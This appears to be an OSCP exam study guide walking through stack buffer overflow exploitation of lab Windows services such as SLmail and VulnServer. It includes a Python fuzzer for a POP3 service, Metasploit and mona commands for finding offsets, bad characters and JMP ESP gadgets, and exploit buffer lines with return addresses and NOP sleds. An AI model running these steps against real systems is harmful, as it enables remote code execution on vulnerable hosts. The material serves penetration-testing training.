# Buffer Overflow Steps for OSCP
## High Level Steps
Buffer overflows will start with an entry point, usually a PoC buffer overflow which causes a crash with not remote code execution. Given this follow the steps below. Each iteration below requires crashing the service each time with immunity attached.
1) [Fuzz the service to replicate the crash in python](#fuzzing)
2) [Create a stand alone crash script](#create-standalone-crash-script)
3) [Find the offset of the EIP overwrite](#find-the-offset-of-the-eip-overrite)
4) [Target and overwrite the EIP](#target-and-overwrite-the-eip)
5) [Find the bad chars for this application](#find-the-bad-chars-for-this-application)
6) [Find code to jump to ESP](#find-code-to-jump-to-esp)
7) [Set a breakpoint on the jump to make sure it works](#set-a-breakpoint-on-the-jump-to-make-sure-it-works)
8) [Generate a payload with MSF and add some no-ops before it](#generate-a-payload-with-msf-and-add-some-no-ops-before-it)
## Fuzzing
Iterate over chunks of data to find a ball park for where the crash is.

Sample Fuzzer
```python

import socket
buff = ["A"]
counter = 100

while( len(buff) <= 30 ):
	buff.append("A"*counter)
	counter=counter + 200
for string in buff:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print("Fuzzing PASS with {} bytes ".format(len(string)))
		s.connect(("10.11.11.42", 110))
		data = s.recv(1024)
		print (data)

		s.send('USER test\r\n')
		data = s.recv(1024)
		print(data)

		s.send('PASS ' + string + '\r\n')
		data = s.recv(1024)
		print(data)

		s.send('QUIT\r\n')

		s.close()
		print("Done")
	except Exception as e:
		print("could not connect to pop 3 because {}".format(e))
```

## Create Standalone Crash Script
Remove the fuzzing from the script and just send the chunk of A's which cause the crash

## Find the offset of the EIP overwrite
Generate a pattern the same length of the A's sent in and make that the payload.
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>
```
Make this the payload and resend to the application. Once it's crashed, use mona to find the pattern offset.
```
!mona findmsp
```

## Target and overwrite the EIP
Overrite the EIP with 'B' by changing the payload to
```python
payload = "A"*find_msp_offset+"B"*4+"C"*remaining_length
```

## Find the bad chars for this application
Use mona and the crash script to find these. If the application is netascii (telnet, ftp, smtp, ect), then there are 3 off the bat, "\x00\x0a\x0d".

```python
bc="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

Remove 0x00,0x0A,0x0D if netascii from the list

Send to the exploit up and wait for the crash

Use mona to find the bad chars.

Generate the local bad chars compare file
```
!mona config -set workingfolder c:\logs\%p
!mona bytearray
```
if netascii, do,
```
!mona bytearray -epb "\x00\x0a\x0d"
``` 

Run mona to find bad chars. Get the address in the ESP.
```
!mona compare -f C:\logs\<app-name>\bytearray.bin -a <address-in-esp>
```

Once a bad char is found, remove from the payload in the python code, regenerate the bytearray in mona and reexploit until the buffers match.

Regenerate byte code without 0xef
```
!mona bytearray -epb "\xef"
```

## Find code to jump to ESP
Find characters with decodes to op codes to in Non-DEP Non-ASLR modules in the code

```
!mona jmp -r esp
```
or
```
!mona find -s “\xff\xe4” 
```

Can search in a specific non-aslr'd module via this:

```
!mona find -s “\xff\xe4” -m <module>
```

## Set a breakpoint on the jump to make sure it works
Set a breakpoint on the jump location to make sure the overwrite of the EIP is correct. 

In immunity, set a break point by navigating to the module section and jumping to the location.

1) window -> modules
2) Select module jump code is in
3) CTRL+G, then type in address
4) Right click on code segment and select "Toggle Breakpoint"
5) May have to select decompile / decode from the context menu to see it as op-codes.

## Generate a payload with MSF and add some no-ops before it
Generate the payload with MSFVenom. Make sure the bad chars are specified as well. When adding to the exploit code, append some no-ops. If the exploit isn't working, e.g. the application is still crashing in immunity keep adding no-ops.

```python
# SLmail
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + buf

# VulnServer
req1 = "AUTH " + "A"*1040 + "\x71\x1d\xd1\x65" + "\x90" * 32 + buf
```

## References

Using Immunity

http://www.fuzzysecurity.com/tutorials/expDev/2.html

Finding Bad Chars

https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/